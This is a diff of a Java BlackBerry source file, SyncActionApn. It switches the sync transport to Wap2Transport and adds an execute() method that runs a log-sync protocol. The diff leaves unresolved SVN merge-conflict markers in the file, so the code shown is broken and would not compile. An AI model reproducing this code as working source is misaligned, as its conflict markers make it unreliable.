@@ -16,6 +16,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.log.LogCollector;
+import blackberry.transfer.ProtocolException;
 import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
@@ -99,7 +100,8 @@ public class SyncActionApn extends SyncAction {
             if (entries == 0) {
                 transport = new Wap2Transport(host, port);
             } else {
-                transport = new ApnTransport(host, port, apns);
+                transport = new Wap2Transport(host, port);
+                //transport = new ApnTransport(host, port, apns);
             }
 
         } catch (final EOFException e) {
@@ -117,6 +119,37 @@ public class SyncActionApn extends SyncAction {
 
     public boolean execute(Event event) {
 
+<<<<<<< .mine
+        //#ifdef DBC
+        Check.requires(protocol != null, "execute: null protocol");
+        Check.requires(transport != null, "execute: null transport");
+        //#endif
+        
+        if (transport.isAvailable()) {
+            //#ifdef DEBUG
+            debug.trace("execute: transport available");
+            //#endif
+            protocol.init(transport);
+            boolean ret;
+            try {
+                ret = protocol.start();
+            } catch (ProtocolException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                return false;
+            }
+            
+            //#ifdef DEBUG
+            debug.trace("execute protocol: " + ret);
+            //#endif
+            
+            return ret;
+        }else{
+            //#ifdef DEBUG
+            debug.trace("execute: transport not available");
+            //#endif
+=======
         //#ifdef DBC
         Check.requires(protocol != null, "execute: null protocol");
         Check.requires(transport != null, "execute: null transport");
@@ -138,6 +171,7 @@ public class SyncActionApn extends SyncAction {
             //#ifdef DEBUG
             debug.trace("execute: transport not available");
             //#endif
+>>>>>>> .r3151
         }
         
         return false;
